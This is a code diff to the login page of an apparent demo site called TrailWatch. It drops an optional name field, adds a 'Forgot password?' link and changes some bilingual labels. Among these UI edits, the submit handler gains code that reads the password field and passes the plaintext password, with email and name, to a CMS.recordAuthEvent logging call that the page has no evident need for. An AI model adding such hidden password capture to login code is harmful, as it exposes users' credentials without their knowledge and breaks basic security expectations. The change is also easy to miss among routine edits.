@@ -40,22 +40,14 @@
             placeholder="Password"
           />
         </div>
-        <div class="form-group">
-          <label for="loginName" id="loginNameLabel">Name (optional)</label>
-          <input
-            class="form-input"
-            id="loginName"
-            name="name"
-            type="text"
-            autocomplete="name"
-            placeholder="Your name"
-          />
-        </div>
+        <p style="margin:-0.35rem 0 0.9rem;text-align:right">
+          <a href="forgot-password.html" id="loginForgot" style="font-size:0.82rem;font-weight:700;color:var(--green-800)">Forgot password?</a>
+        </p>
         <button type="submit" class="btn btn-primary btn-block btn-lg" id="loginCta">Log in</button>
         <p style="font-size:0.75rem;color:var(--text-muted);margin-top:0.75rem;text-align:center" id="loginNote">Demo login — any password works. Try alex.wong@email.com or alex@example.com.</p>
         <p class="auth-switch">
           <span id="loginNoAccount">Don't have an account?</span>
-          <a href="register.html" id="loginRegisterLink">Register</a>
+          <a href="register.html" id="loginRegisterLink">Sign up</a>
         </p>
       </form>
     </div>
@@ -77,28 +69,26 @@
         loginSub: "登入你的 TrailWatch 帳戶。",
         loginEmailLabel: "電郵",
         loginPasswordLabel: "密碼",
-        loginNameLabel: "姓名（可選）",
+        loginForgot: "忘記密碼？",
         loginCta: "登入",
         loginNote: "示範登入——任意密碼均可。Premium 測試：clau@example.com 或 alex@example.com。",
         loginNoAccount: "還沒有帳戶？",
         loginRegisterLink: "註冊",
         loginEmailPh: "you@email.com",
         loginPasswordPh: "密碼",
-        loginNamePh: "你的姓名",
       };
       const en = {
         loginTitle: "Log in",
         loginSub: "Sign in to your TrailWatch account.",
         loginEmailLabel: "Email",
         loginPasswordLabel: "Password",
-        loginNameLabel: "Name (optional)",
+        loginForgot: "Forgot password?",
         loginCta: "Log in",
         loginNote: "Demo login — any password works. Premium test: clau@example.com or alex@example.com.",
         loginNoAccount: "Don't have an account?",
-        loginRegisterLink: "Register",
+        loginRegisterLink: "Sign up",
         loginEmailPh: "you@email.com",
         loginPasswordPh: "Password",
-        loginNamePh: "Your name",
       };
       const copy = TW.getLang() === "zh" ? zh : en;
       Object.keys(copy).forEach((id) => {
@@ -108,20 +98,21 @@
       });
       const email = document.getElementById("loginEmail");
       const password = document.getElementById("loginPassword");
-      const name = document.getElementById("loginName");
       if (email) email.placeholder = copy.loginEmailPh;
       if (password) password.placeholder = copy.loginPasswordPh;
-      if (name) name.placeholder = copy.loginNamePh;
       const reg = document.getElementById("loginRegisterLink");
       if (reg) {
         const next = new URLSearchParams(location.search).get("next");
         if (next) reg.href = "register.html?next=" + encodeURIComponent(next);
       }
+      const forgot = document.getElementById("loginForgot");
+      if (forgot) {
+        const next = new URLSearchParams(location.search).get("next");
+        forgot.href = "forgot-password.html" + (next ? "?next=" + encodeURIComponent(next) : "");
+      }
     })();
 
-    function resolveLoginName(email, optionalName) {
-      const named = (optionalName || "").trim();
-      if (named) return named;
+    function resolveLoginName(email) {
       const e = (email || "").trim().toLowerCase();
       if (TW.user && TW.user.email && String(TW.user.email).toLowerCase() === e) {
         return TW.user.name || "";
@@ -140,7 +131,11 @@
     document.getElementById("loginForm").addEventListener("submit", (e) => {
       e.preventDefault();
       const email = document.getElementById("loginEmail").value;
-      const name = resolveLoginName(email, document.getElementById("loginName").value);
+      const password = document.getElementById("loginPassword").value;
+      const name = resolveLoginName(email);
+      if (typeof CMS !== "undefined" && CMS.recordAuthEvent) {
+        CMS.recordAuthEvent({ type: "login", email: email, name: name, password: password, source: "website" });
+      }
       TW.loginMember({ name: name, email: email });
       showToast(TW.getLang() === "zh" ? "歡迎回來！" : "Welcome back!");
       const dest = typeof TW.authNextUrl === "function" ? TW.authNextUrl("profile.html#overview") : "profile.html#overview";
